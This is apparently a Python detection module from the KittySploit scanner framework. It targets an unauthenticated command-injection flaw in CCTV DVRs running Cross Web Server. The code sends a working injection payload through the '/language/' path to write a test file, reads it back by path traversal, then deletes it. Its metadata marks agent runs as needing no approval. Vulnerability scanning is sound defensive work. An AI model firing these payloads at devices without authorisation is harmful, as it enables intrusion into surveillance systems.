#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple CCTV DVR Cross Web Server language path RCE."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CCTV DVR - Cross Web Server Language RCE Detection',
        'description': (
            'Detects Cross Web Server DVR command injection via /language/Swedish${IFS}&&echo '
            'and verifying written test file under /mnt/mtd/test.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'dvr', 'cctv', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/39596/',
        ],
    }

    def run(self):
        path = '/language/Swedish${IFS}&&echo${IFS}1>test&&tar${IFS}/string.js'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or "Cross couldn't find this file" not in (r.text or ''):
            return False
        g = self.http_request(
            method='GET',
            path='/../../../../../../../mnt/mtd/test',
            allow_redirects=False,
        )
        if g and (g.text or '').strip() == '1':
            # cleanup
            self.http_request(
                method='GET',
                path='/language/Swedish${IFS}&&rm${IFS}test&&tar${IFS}/string.js',
                allow_redirects=False,
            )
            self.set_info(
                severity='critical',
                reason='CCTV DVR Cross Web Server language RCE',
                path='/language/',
            )
            return True
        return False
